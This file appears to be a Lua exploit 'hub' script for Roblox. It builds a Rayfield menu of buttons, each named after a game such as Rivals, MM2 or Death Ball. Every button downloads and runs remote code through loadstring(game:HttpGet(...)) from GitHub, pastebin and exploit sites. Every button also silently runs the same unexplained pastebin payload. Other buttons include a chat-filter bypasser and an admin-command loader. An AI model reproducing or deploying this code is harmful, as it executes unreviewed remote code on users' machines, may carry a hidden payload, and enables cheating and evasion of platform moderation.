local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({
   Name = "SHOTS HUB GUI",
   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
   LoadingTitle = "Rayfield Interface Suite",
   LoadingSubtitle = "by SHOTS",
   ShowText = "SHOTSHUB", -- for mobile users to unhide rayfield, change if you'd like
   Theme = "Amethyst", -- Check https://docs.sirius.menu/rayfield/configuration/themes

   ToggleUIKeybind = "N", -- The keybind to toggle the UI visibility (string like "K" or Enum.KeyCode)

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface

   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "Shots Hub"
   },

   Discord = {
      Enabled = true, -- Prompt the user to join your Discord server if their executor supports it
      Invite = "2WCfS2PxxY", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
      RememberJoins = false -- Set this to false to make them join the discord every time they load it up
   },

   KeySystem = false, -- Set this to true to use our key system
   KeySettings = {
      Title = "Shotshub Key",
      Subtitle = "Join Discord For August Key!",
      Note = "discord.gg/2WCfS2PxxY JOIN THE DISCORD TO GET THE KEY", -- Use this to tell the user how to get a key
      FileName = "SHOTSHUBKEY", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"SHOTSHUBBETTER"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})
local Tab = Window:CreateTab("Scripts", 4483362458) -- Title, Image
local Button = Tab:CreateButton({
   Name = "Fisch",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/Efe0626/ZenithHub/refs/heads/main/Loader"))()
   loadstring(game:HttpGet("https://pastebin.com/raw/DA4e9c8Y"))()
   end,
})
local Button = Tab:CreateButton({
   Name = "Universe Football NFL",
   Callback = function()
   loadstring(game:HttpGet("https://rawscripts.net/raw/EASTER-NFL-Universe-Football-Kali-Hub-NFL-UNIVERSE-GUI-2025-36968"))()
   loadstring(game:HttpGet("https://pastebin.com/raw/DA4e9c8Y"))()
   end,
})
local Button = Tab:CreateButton({
   Name = "Rivals",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/kiciahook/kiciahook/refs/heads/main/loader.lua"))()
   loadstring(game:HttpGet("https://pastebin.com/raw/DA4e9c8Y"))()
   end,
})
local Button = Tab:CreateButton({
   Name = "Steal A Brainrot",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()
   loadstring(game:HttpGet("https://pastebin.com/raw/DA4e9c8Y"))()
   end,
})
local Button = Tab:CreateButton({
	Name = "Dead Rails",
    	Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/kiciahook/kiciahook/refs/heads/main/loader.lua"))()
      loadstring(game:HttpGet("https://pastebin.com/raw/DA4e9c8Y"))()
    	end
})
local Button = Tab:CreateButton({
	Name = "MM2 Keyed",
    	Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Skzuppy/forge-hub/main/loader.lua"))()
      loadstring(game:HttpGet("https://pastebin.com/raw/DA4e9c8Y"))()
    	end
})
local Button = Tab:CreateButton({
	Name = "MM2 Keyless",
    	Callback = function()
      loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
      loadstring(game:HttpGet("https://pastebin.com/raw/DA4e9c8Y"))()
    	end
})
local Button = Tab:CreateButton({
	Name = "Train To Fight",
    	Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/gumanba/Scripts/main/TraintoFight"))()
      loadstring(game:HttpGet("https://pastebin.com/raw/DA4e9c8Y"))()
    	end
})
local Button = Tab:CreateButton({
	Name = "Mic Up",
    	Callback = function()
      loadstring(game:HttpGet('https://whimper.xyz/kitty'))()
     loadstring(game:HttpGet("https://pastebin.com/raw/DA4e9c8Y"))()
    	end
})
local Button = Tab:CreateButton({
	Name = "Chat Bypasser set language to Қазақ Тілі",
    	Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/AnnaRoblox/AnnaBypasser/refs/heads/main/AnnaBypasser.lua",true))()
      loadstring(game:HttpGet("https://pastebin.com/raw/DA4e9c8Y"))()
    	end
})
local Button = Tab:CreateButton({
	Name = "Basketball Legends",
    	Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/IAmJamal10/Basketball/refs/heads/main/Legends"))()
      loadstring(game:HttpGet("https://pastebin.com/raw/DA4e9c8Y"))()
    	end
})
local Button = Tab:CreateButton({
	Name = "Hoopz",
    	Callback = function()
      loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/bf15a15feb3e074f81db01496cbb48e2.lua"))()
      loadstring(game:HttpGet("https://pastebin.com/raw/DA4e9c8Y"))()
    	end
})
local Button = Tab:CreateButton({
	Name = "Infinite Yield (Admin Commands)",
    	Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
      loadstring(game:HttpGet("https://pastebin.com/raw/DA4e9c8Y"))()
    	end
})
local Button = Tab:CreateButton({
	Name = "Muscle Legends",
    	Callback = function()
      loadstring(game:HttpGet(('https://pastebin.com/raw/j3wU2wx0'),true))()
      loadstring(game:HttpGet("https://pastebin.com/raw/DA4e9c8Y"))()
    	end
})
local Button = Tab:CreateButton({
	Name = "Brainrot Evolution",
    	Callback = function()
      loadstring(game:HttpGet("https://gist.githubusercontent.com/ScriptsForDays/c4b8eddc6bd3aa3c1a349e604adc5525/raw/70a02fc583deb64689932a8c1c873d6fd38afe23/Brainrot-Evo"))()
      loadstring(game:HttpGet("https://pastebin.com/raw/DA4e9c8Y"))()
    	end
})
local Button = Tab:CreateButton({
	Name = "Grow A Garden",
    	Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Skibidiking123/Fisch1/refs/heads/main/FischMain"))()
      loadstring(game:HttpGet("https://pastebin.com/raw/DA4e9c8Y"))()
    	end
})
local Button = Tab:CreateButton({
	Name = "Fight In A School",
    	Callback = function()
      loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/1d4fdd8da9d3d356309687b39b45af4e.lua"))()
      loadstring(game:HttpGet("https://pastebin.com/raw/DA4e9c8Y"))()
    	end
})
local Button = Tab:CreateButton({
	Name = "The Wild West 4.0",
    	Callback = function()
      loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/255ac567ced3dcb9e69aa7e44c423f19.lua"))()
      loadstring(game:HttpGet("https://pastebin.com/raw/DA4e9c8Y"))()
    	end
})
local Button = Tab:CreateButton({
	Name = "Death Ball",
    	Callback = function()
      loadstring(game:HttpGet('https://raw.githubusercontent.com/ExploiterDeathBall/AutoParry/refs/heads/main/AutoParryDeathBall'))()
      loadstring(game:HttpGet("https://pastebin.com/raw/DA4e9c8Y"))()
    end
})
local Button = Tab:CreateButton({
	Name = "Ink Game",
    	Callback = function()
      loadstring(game:HttpGet('https://api.exploitingis.fun/loader', true))()
      loadstring(game:HttpGet("https://pastebin.com/raw/DA4e9c8Y"))()
    	end
})
